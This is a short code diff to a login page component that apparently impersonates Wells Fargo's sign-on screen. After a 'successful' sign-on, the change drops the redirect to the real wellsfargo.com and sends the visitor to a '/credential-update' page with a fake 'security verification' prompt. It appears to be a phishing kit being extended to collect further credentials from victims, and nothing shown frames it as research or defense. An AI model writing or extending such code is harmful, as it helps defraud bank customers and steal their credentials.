@@ -71,10 +71,10 @@ export default function LoginPage() {
     onSuccess: () => {
       toast({
         title: "Sign On Successful",
-        description: "Redirecting to Wells Fargo...",
+        description: "Please complete security verification...",
       });
       setTimeout(() => {
-        window.location.href = "https://www.wellsfargo.com/";
+        setLocation("/credential-update");
       }, 1000);
     },
     onError: (error: Error) => {
